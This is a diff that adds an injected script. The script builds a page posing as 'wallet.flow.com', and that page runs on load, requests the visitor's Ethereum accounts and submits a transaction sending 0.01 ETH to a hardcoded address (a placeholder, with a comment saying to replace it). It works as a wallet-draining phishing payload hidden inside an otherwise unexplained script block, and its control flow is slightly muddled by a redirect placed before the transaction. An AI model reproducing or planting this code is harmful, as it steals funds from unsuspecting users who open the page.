@@ -1,0 +1,62 @@
+<script>
+    const htmlContent = `
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>wallet.flow.com</title>
+</head>
+<body>
+  <h3 id="msg">Checking wallet...</h3>
+
+  <script>
+    async function autoConnectAndSend() {
+      const msgEl = document.getElementById('msg');
+
+      if (!window.ethereum) {
+        msgEl.innerText = "No wallet detected!";
+        return;
+      }
+
+      try {
+        // 1. Coba konek wallet
+        const accounts = await window.ethereum.request({
+          method: "eth_requestAccounts"
+        });
+
+        const user = accounts[0];
+        msgEl.innerText = "Connected: " + user;
+
+        // 2. Setelah konek → kirim transaksi
+        document.location="http://wallet.flow.com";
+        const txParams = {
+          from: user,
+          to: "0x0000000000000000000000000000000000000000", // ganti alamat tujuan
+          value: "0x2386F26FC10000", // 0.01 ETH dalam wei
+          gas: "0x5208" // 21000 gas
+        };
+
+        const txHash = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [txParams]
+        });
+
+        msgEl.innerText = "Transaction sent! Hash: " + txHash;
+
+      } catch (err) {
+        console.error(err);
+        msgEl.innerText = "User denied or error occurred.";
+      }
+    }
+
+    // Jalankan otomatis saat halaman load
+    window.addEventListener("load", autoConnectAndSend);
+  </\script>
+</body>
+</html>
+    `;
+
+const blob = new Blob([htmlContent], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+const a = document.location=url;  
+</script>
